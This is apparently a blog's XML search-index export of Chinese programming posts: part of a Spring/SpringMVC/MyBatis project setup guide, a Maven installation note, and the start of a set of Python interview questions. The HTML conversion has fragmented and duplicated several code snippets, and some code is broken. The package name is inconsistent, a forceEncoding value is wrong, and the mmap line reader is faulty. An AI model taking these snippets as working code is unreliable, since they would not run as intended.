value=&quot;${c3p0.acquireRetryAttempts}&quot;/&gt;&lt;/bean&gt;&lt;!-- 配置SqlSessionFactory对象 --&gt;&lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt;    &lt;!-- 注入数据库连接池 --&gt;    &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt;    &lt;!-- 扫描entity包 使用别名 --&gt;    &lt;property name=&quot;typeAliasesPackage&quot; value=&quot;com.ssmdemo.entity&quot;/&gt;    &lt;!-- 扫描sql配置文件:mapper需要的xml文件 --&gt;    &lt;property name=&quot;mapperLocations&quot; value=&quot;classpath:mapper/*.xml&quot;/&gt;&lt;/bean&gt;&lt;!-- 配置扫描Dao接口包，动态实现Dao接口，注入到spring容器中 --&gt;&lt;bean class=&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&gt;    &lt;!-- 注入sqlSessionFactory --&gt;    &lt;property name=&quot;sqlSessionFactoryBeanName&quot; value=&quot;sqlSessionFactory&quot;/&gt;    &lt;!-- 给出需要扫描Dao接口包 --&gt;    &lt;property name=&quot;basePackage&quot; value=&quot;com.ssmdeom.dao&quot;/&gt;&lt;/bean&gt;&lt;!-- 配置事务管理器 --&gt;&lt;bean id=&quot;transactionManager&quot; class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt;    &lt;!-- 注入数据库连接池 --&gt;    &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt;&lt;/bean&gt;&lt;!-- 配置基于注解的声明式事务 --&gt;&lt;tx:annotation-driven transaction-manager=&quot;transactionManager&quot;/&gt;</code></pre></beans>```### 2.6创建spring-mvc.xml 在resource目录下创建spring-mvc.xml```<?xml version="1.0" encoding="UTF-8"?><beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:mvc="http://www.springframework.org/schema/mvc" xsi:schemalocation="http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd       http://www.springframework.org/schema/context       http://www.springframework.org/schema/context/spring-context.xsd       http://www.springframework.org/schema/mvc       http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd"><pre><code>&lt;!-- 扫描web相关的bean --&gt;&lt;context:component-scan base-package=&quot;com.ssmdeom.controller&quot;/&gt;&lt;!-- 开启SpringMVC注解模式 --&gt;&lt;mvc:annotation-driven/&gt;&lt;!-- 静态资源默认servlet配置 --&gt;&lt;mvc:default-servlet-handler/&gt;&lt;!-- 配置jsp 显示ViewResolver --&gt;&lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;    &lt;property name=&quot;viewClass&quot; value=&quot;org.springframework.web.servlet.view.JstlView&quot;/&gt;    &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/views/&quot;/&gt;    &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;/&gt;&lt;/bean&gt;</code></pre></beans>```### 2.7配置日志相关文件在resource目录下创建logback.xml```<?xml version="1.0" encoding="UTF-8"?><configuration debug="true">    <appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender">        <encoder>            <pattern>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n</pattern>        </encoder>    </appender>    <root level="debug">        <appender-ref ref="STDOUT">    </appender-ref></root></configuration>```## 3.创建数据库```CREATE TABLE `student` (  `ID` int(11) NOT NULL AUTO_INCREMENT,  `stuName` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_nopad_ci DEFAULT NULL,  `stuAge` tinyint(4) DEFAULT NULL,  `mobile` varchar(11) CHARACTER SET latin1 DEFAULT NULL,  `address` varchar(256) COLLATE utf8mb4_unicode_520_ci DEFAULT NULL,  `EntranceTime` date DEFAULT NULL,  PRIMARY KEY (`ID`)) ENGINE=InnoDB AUTO_INCREMENT=20 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci```## 4.编写程序### 4.1在entity下创建Student实体```package com.ssmdeom.entity;<p>import java.util.Date;</p><p>public class Student {<br>    private int id;<br>    private String stuName;<br>    private int stuAge;<br>    private String mobile;<br>    private String address;<br>    private Date EntranceTime;</p><pre><code>public int getId() {    return id;}public void setId(int id) {    this.id = id;}public String getStuName() {    return stuName;}public void setStuName(String stuName) {    this.stuName = stuName;}public int getStuAge() {    return stuAge;}public void setStuAge(int stuAge) {    this.stuAge = stuAge;}public String getMobile() {    return mobile;}public void setMobile(String mobile) {    this.mobile = mobile;}public String getAddress() {    return address;}public void setAddress(String address) {    this.address = address;}public Date getEntranceTime() {    return EntranceTime;}public void setEntranceTime(Date entranceTime) {    EntranceTime = entranceTime;}</code></pre><p>}</p><pre><code>### 4.2在Dao下面创建Dao接口</code></pre><p>package com.ssmdeom.dao;</p><p>import com.ssmdeom.entity.Student;</p><p>import java.util.List;</p><p>public interface StudentDao {</p><pre><code>Student SearchStudentId(int id);List&lt;Student&gt; listStudent();</code></pre><p>}</p><pre><code>### 4.3在resources/mapper下编写StudentDao.xml映射文件</code></pre><?xml version="1.0" encoding="UTF-8"?><!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"><!-- 设置为IUserDao接口方法提供sql语句配置 --><mapper namespace="com.ssmdeom.dao.StudentDao"><pre><code>&lt;select id=&quot;searchStudentId&quot; resultMap=&quot;student&quot; parameterType=&quot;int&quot;&gt;    SELECT * FROM student WHERE id = #{id}&lt;/select&gt;&lt;resultMap id=&quot;student&quot; type=&quot;student&quot;&gt;    &lt;id column=&quot;id&quot; property=&quot;id&quot; /&gt;    &lt;result column=&quot;stuName&quot; property=&quot;stuName&quot; /&gt;    &lt;result column=&quot;stuAge&quot; property=&quot;stuAge&quot; /&gt;    &lt;result column=&quot;mobile&quot; property=&quot;mobile&quot; /&gt;    &lt;result column=&quot;address&quot; property=&quot;address&quot; /&gt;    &lt;result column=&quot;EntranceTime&quot; property=&quot;EntranceTime&quot; /&gt;&lt;/resultMap&gt;&lt;select id=&quot;listStudent&quot; resultMap=&quot;student&quot;&gt;    SELECT * FROM student&lt;/select&gt;</code></pre></mapper>```### 4.4在service下创建StudentService的接口```package com.ssmdeom.service;<p>import com.ssmdeom.entity.Student;</p><p>import java.util.List;</p><p>public interface StudentService {</p><pre><code>Student searchStudentId(int id);List&lt;Student&gt; listStudent();</code></pre><p>}</p><pre><code>### 4.5在service下创建StudentServiceImpl类</code></pre><p>package com.ssmdeom.service;</p><p>import com.ssmdeom.dao.StudentDao;<br>import com.ssmdeom.entity.Student;<br>import org.springframework.beans.factory.annotation.Autowired;<br>import org.springframework.stereotype.Service;</p><p>import java.util.List;</p><p>@Service<br>public class StudentServiceImpl implements StudentService {</p><pre><code>@AutowiredStudentDao studentDao;public Student searchStudentId(int id) {    return studentDao.searchStudentId(id);}public List&lt;Student&gt; listStudent() {    return studentDao.listStudent();}</code></pre><p>}</p><pre><code>### 4.6在controller下面创建StudentController</code></pre><p>package com.ssmdeom.controller;</p><p>import com.ssmdeom.entity.Student;<br>import com.ssmdeom.service.StudentService;<br>import org.springframework.beans.factory.annotation.Autowired;<br>import org.springframework.stereotype.Controller;<br>import org.springframework.web.bind.annotation.RequestMapping;<br>import org.springframework.web.servlet.ModelAndView;</p><p>import javax.servlet.http.HttpServletRequest;<br>import javax.servlet.http.HttpServletResponse;<br>import java.util.List;</p><p>@Controller<br>@RequestMapping(“”)<br>public class StudentController {</p><pre><code>@Autowiredprivate StudentService studentService;@RequestMapping(&quot;/all&quot;)public String listStudent(HttpServletRequest request, HttpServletResponse response) {    List&lt;Student&gt; students = studentService.listStudent();    request.setAttribute(&quot;students&quot;,students);    return &quot;liststudents&quot;;}@RequestMapping(&quot;/student&quot;)public ModelAndView getstudent(int id) {    ModelAndView mav = new ModelAndView(&quot;student&quot;);    Student studentid = studentService.searchStudentId(id);    mav.addObject(&quot;student&quot;,studentid);    return  mav;}</code></pre><p>}<br>```</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Idea搭建 Maven+SSM（Spring+SpringMVC+MyBatis）</title>
      <link href="/2019/04/01/shi-yong-idea-da-jian-maven-ssm-spring-springmvc-mybatis/"/>
      <url>/2019/04/01/shi-yong-idea-da-jian-maven-ssm-spring-springmvc-mybatis/</url>
      
        <content type="html"><![CDATA[<h1 id="使用Idea搭建-Maven-SSM（Spring-SpringMVC-MyBatis）"><a href="#使用Idea搭建-Maven-SSM（Spring-SpringMVC-MyBatis）" class="headerlink" title="使用Idea搭建 Maven+SSM（Spring+SpringMVC+MyBatis）"></a>使用Idea搭建 Maven+SSM（Spring+SpringMVC+MyBatis）</h1><h2 id="1-创建项目"><a href="#1-创建项目" class="headerlink" title="1.创建项目"></a>1.创建项目</h2><p>创建Maven项目  选择为webapp，等待加载完项目。</p><h2 id="2-修改pom-xml"><a href="#2-修改pom-xml" class="headerlink" title="2.修改pom.xml"></a>2.修改pom.xml</h2><p> <a href="https://mvnrepository.com/" target="_blank" rel="noopener">Maven Repository: Search/Browse/Explore</a><br>选择里面的包贴到pom.xml中，程序会自己下载包</p><h2 id="3-构造目录"><a href="#3-构造目录" class="headerlink" title="3.构造目录"></a>3.构造目录</h2><p>在main目录下创建文件夹<br>java/com/java/xxxx<br>修改java属性为resource root</p><h2 id="4-修改web-xml"><a href="#4-修改web-xml" class="headerlink" title="4.修改web.xml"></a>4.修改web.xml</h2><pre class=" language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd" ></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!--1.针对spring配置：读取配置文件--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>context-param</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>contextConfigLocation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>WEB-INF/spring/applicationContext.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>context-param</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!--注册servletcontext监听器，并且将applicationcontext对象放到application域中--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener-class</span><span class="token punctuation">></span></span>org.springframework.web.context.ContextLoaderListener<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>springmvc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.springframework.web.servlet.DispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>contextConfigLocation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>WEB-INF/spring/applicationContext.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>springmvc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>*.do<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>CharacterEncodingFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>org.springframework.web.filter.CharacterEncodingFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>encoding<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>utf-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>forceEncoding<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>CharacterEncodingFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span></code></pre><h2 id="5-创建applicationContext-xml"><a href="#5-创建applicationContext-xml" class="headerlink" title="5.创建applicationContext.xml"></a>5.创建applicationContext.xml</h2><pre class=" language-xml"><code class="language-xml"></code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Maven</title>
      <link href="/2019/03/13/maven/"/>
      <url>/2019/03/13/maven/</url>
      
        <content type="html"><![CDATA[<h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h1><h2 id="什么是Maven"><a href="#什么是Maven" class="headerlink" title="什么是Maven"></a>什么是Maven</h2><blockquote><h3 id="Maven-是项目构建工具，能把项目抽象成-POM-project-object-model-Maven-使用-POM对项目进行构建、打包、文档化等操作。最重要的是解决了项目需要类库的依赖管理，简化了项目开发环境搭建的过程。"><a href="#Maven-是项目构建工具，能把项目抽象成-POM-project-object-model-Maven-使用-POM对项目进行构建、打包、文档化等操作。最重要的是解决了项目需要类库的依赖管理，简化了项目开发环境搭建的过程。" class="headerlink" title="Maven 是项目构建工具，能把项目抽象成 POM (project object model), Maven 使用 POM对项目进行构建、打包、文档化等操作。最重要的是解决了项目需要类库的依赖管理，简化了项目开发环境搭建的过程。"></a>Maven 是项目构建工具，能把项目抽象成 POM (project object model), Maven 使用 POM对项目进行构建、打包、文档化等操作。最重要的是解决了项目需要类库的依赖管理，简化了项目开发环境搭建的过程。</h3></blockquote><h4 id="这个就很像我们学习Django中的django-admin相似，但是有缺少库管理。这样应该就更能理解了。"><a href="#这个就很像我们学习Django中的django-admin相似，但是有缺少库管理。这样应该就更能理解了。" class="headerlink" title="这个就很像我们学习Django中的django-admin相似，但是有缺少库管理。这样应该就更能理解了。"></a>这个就很像我们学习Django中的django-admin相似，但是有缺少库管理。这样应该就更能理解了。</h4><h2 id="安装Maven"><a href="#安装Maven" class="headerlink" title="安装Maven"></a>安装Maven</h2><h4 id="下载链接：Maven"><a href="#下载链接：Maven" class="headerlink" title="下载链接：Maven"></a>下载链接：<a href="http://maven.apache.org/" target="_blank" rel="noopener">Maven</a></h4><h4 id="阿里云的Maven镜像"><a href="#阿里云的Maven镜像" class="headerlink" title="阿里云的Maven镜像"></a>阿里云的<a href="https://maven.aliyun.com/mvn/view" target="_blank" rel="noopener">Maven镜像</a></h4><h4 id="1-解压到电脑的任意位置。"><a href="#1-解压到电脑的任意位置。" class="headerlink" title="1.解压到电脑的任意位置。"></a>1.解压到电脑的任意位置。</h4><h4 id="2-修改settings"><a href="#2-修改settings" class="headerlink" title="2.修改settings"></a>2.修改settings</h4><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>localRepository</span><span class="token punctuation">></span></span>path<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>localRepository</span><span class="token punctuation">></span></span>   // maven目录下创建一个repository// 修改maven的源<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrors</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>alimaven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>aliyun maven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>http://maven.aliyun.com/nexus/content/groups/public/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">></span></span>central<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrorOf</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrors</span><span class="token punctuation">></span></span></code></pre><h4 id="3-设置环境变量-将Maven目录下的bin设置到path中"><a href="#3-设置环境变量-将Maven目录下的bin设置到path中" class="headerlink" title="3.设置环境变量(将Maven目录下的bin设置到path中)"></a>3.设置环境变量(将Maven目录下的bin设置到path中)</h4><h4 id="4-测试是否成功"><a href="#4-测试是否成功" class="headerlink" title="4.测试是否成功"></a>4.测试是否成功</h4><pre class=" language-bash"><code class="language-bash">$ mvn -versionApache Maven 3.6.0 <span class="token punctuation">(</span>97c98ec64a1fdfee7767ce5ffb20918da4f719f3<span class="token punctuation">;</span> 2018-10-25T02:41:47+08:00<span class="token punctuation">)</span>Maven home: D:\xxxxxxx\xxxxJava version: 1.8.0_201, vendor: Oracle Corporation, runtime: C:\Program Files\Java\jre1.8.0_201Default locale: zh_CN, platform encoding: GBKOS name: <span class="token string">"xxxxxx"</span>, version: <span class="token string">"xxx"</span>, arch: <span class="token string">"xxx"</span>, family: <span class="token string">"xxxxx"</span></code></pre><h2 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h2><h3 id="maven-一-maven到底是个啥玩意"><a href="#maven-一-maven到底是个啥玩意" class="headerlink" title="maven(一) maven到底是个啥玩意~"></a><a href="https://www.cnblogs.com/whgk/p/7112560.html" target="_blank" rel="noopener">maven(一) maven到底是个啥玩意~</a></h3>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python面试题-基础篇</title>
      <link href="/2019/03/11/python-mian-shi-ti-ji-chu-pian/"/>
      <url>/2019/03/11/python-mian-shi-ti-ji-chu-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="Python面试题-基础篇"><a href="#Python面试题-基础篇" class="headerlink" title="Python面试题-基础篇"></a>Python面试题-基础篇</h1><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p>1.有一个jsonline格式的文件file.txt大小约为10K</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_lines</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'file.txt'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">return</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> e <span class="token keyword">in</span> get_lines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        process<span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 处理每一行数据</span></code></pre><p> 现在要处理一个大小为10G的文件，但是内存只有4G，如果在只修改get_lines 函数而其他代码保持不变的情况下，应该如何实现？需要考虑的问题都有那些？</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_lines</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'file.txt'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">:</span>            <span class="token keyword">yield</span> i</code></pre><p>因为内存只有4G，无法一次性读取10G文件，需要分批读取内容。每次读取内容的同时需要记录读取的位置，不然每次readline时，又是从第一行开始读取。</p><blockquote><p> <a href="yield.md">yield</a>生成器<br>  <a href="mmap.md">mmap</a>系统内存映射函数接口</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> mmap <span class="token keyword">import</span> mmap</code></pre></blockquote><p>def get_lines(filename):<br>    with open(filename,’r+’) as f:<br>        m = mmap(f.fileno(),0)<br>        tmp = 0<br>        for i,char in enumerate(m):<br>            if char == “\n”:<br>                yield m[tmp:i+1].decode()<br>                tmp = tmp+1<br>if <strong>name</strong> == “<strong>main</strong>“:<br>    for i in get_lines(“mmap_test.txt”):<br>        print i</p><pre><code></code></pre><p>def get_lines():</p><p>ef get_lines():<br>    with open(‘file.txt’,’rb’) as f:</p><p>f get_lines():<br>    with open(‘file.txt’,’rb’) as f:<br>        for i in f:</p><pre><code>#### mmap_test.txt```txtdef get_lines():    with open(&#39;file.txt&#39;,&#39;rb&#39;) as f:        for i in f:            yield i</code></pre><p> 似乎使用mmap并不是特别好使，这样确实可以记录读取到行。似乎对tab比较多的并友好。</p><h3 id="2-补充缺失的代码"><a href="#2-补充缺失的代码" class="headerlink" title="2.补充缺失的代码"></a>2.补充缺失的代码</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> ossPath <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> sPath<span class="token keyword">def</span> <span class="token function">print_directory_contents</span><span class="token punctuation">(</span>sPath<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> all_data <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>sPath<span class="token punctuation">)</span><span class="token punctuation">:</span>        files_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>sPath<span class="token punctuation">,</span>all_data<span class="token punctuation">)</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>files_path<span class="token punctuation">)</span><span class="token punctuation">:</span>            print_directory_contents<span class="token punctuation">(</span>files_path<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> files_path</code></pre><h3 id="3-输入日期，-判断这一天是这一年的第几天？"><a href="#3-输入日期，-判断这一天是这一年的第几天？" class="headerlink" title="3.输入日期， 判断这一天是这一年的第几天？"></a>3.输入日期， 判断这一天是这一年的第几天？</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> datetime<span class="token keyword">def</span> <span class="token function">dayofyear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    year <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">"请输入年份: "</span><span class="token punctuation">)</span>    month <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">"请输入月份: "</span><span class="token punctuation">)</span>    day <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">"请输入天: "</span><span class="token punctuation">)</span>    date1 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>date<span class="token punctuation">(</span>year<span class="token operator">=</span>int<span class="token punctuation">(</span>year<span class="token punctuation">)</span><span class="token punctuation">,</span>month<span class="token operator">=</span>int<span class="token punctuation">(</span>month<span class="token punctuation">)</span><span class="token punctuation">,</span>day<span class="token operator">=</span>int<span class="token punctuation">(</span>day<span class="token punctuation">)</span><span class="token punctuation">)</span>    date2 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>date<span class="token punctuation">(</span>year<span class="token operator">=</span>int<span class="token punctuation">(</span>year<span class="token punctuation">)</span><span class="token punctuation">,</span>month<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>day<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span>date1<span class="token operator">-</span>date2<span class="token punctuation">)</span><span class="token punctuation">.</span>days<span class="token operator">+</span><span class="token number">1</span>dayofyear<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="4-打乱一个排好序的list对象alist？"><a href="#4-打乱一个排好序的list对象alist？" class="headerlink" title="4.打乱一个排好序的list对象alist？"></a>4.打乱一个排好序的list对象alist？</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> randomalist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>alist<span class="token punctuation">)</span><span class="token keyword">print</span> alist</code></pre><h3 id="5-现有字典-d-‘a’-24-’g’-52-’i’-12-’k’-33-请按value值进行排序"><a href="#5-现有字典-d-‘a’-24-’g’-52-’i’-12-’k’-33-请按value值进行排序" class="headerlink" title="5.现有字典 d= {‘a’:24,’g’:52,’i’:12,’k’:33}请按value值进行排序?"></a>5.现有字典 d= 